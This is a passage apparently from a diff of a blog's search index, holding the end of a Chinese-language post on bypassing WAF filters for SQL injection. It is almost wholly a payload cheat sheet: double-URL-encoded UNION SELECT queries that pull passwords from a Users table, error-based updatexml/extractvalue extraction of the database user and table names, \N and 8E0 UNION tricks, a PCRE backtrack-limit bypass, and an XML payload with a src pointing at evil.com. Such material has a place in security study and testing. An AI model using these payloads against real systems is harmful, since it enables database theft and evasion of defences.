class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a <span class="operator">/</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,password<span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span>Users<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line">举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span> pwd <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="生僻函数"><a href="#生僻函数" class="headerlink" title="生僻函数"></a>生僻函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL<span class="operator">/</span>PostgreSQL支持XML函数：<span class="keyword">Select</span> UpdateXML(‘<span class="operator">&lt;</span>script x<span class="operator">=</span>_<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span> ’,’<span class="operator">/</span>script<span class="operator">/</span><span class="variable">@x</span><span class="operator">/</span>’,’src<span class="operator">=</span><span class="operator">/</span><span class="operator">/</span>evil.com’);　　　　　　　　　　</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> xmlelement(name img,xmlattributes(<span class="number">1</span><span class="keyword">as</span> src,<span class="string">&#x27;a\l\x65rt(1)&#x27;</span><span class="keyword">as</span> \<span class="number">117</span>n\x65rror));　<span class="operator">/</span><span class="operator">/</span>postgresql</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5c</span>))</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="N绕过"><a href="#N绕过" class="headerlink" title="\N绕过"></a>\N绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br><span class="line">  <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="PCRE绕过"><a href="#PCRE绕过" class="headerlink" title="PCRE绕过"></a>PCRE绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PHP 的 pcre.backtrack_limit 限制利用</span><br><span class="line"><span class="keyword">union</span><span class="comment">/*aaaaaaaxN*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><strong>上面的还不行就尝试修改语句逻辑再绕过试试</strong></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQLInject</tag>
       </tags>
   </entry>
 </search>
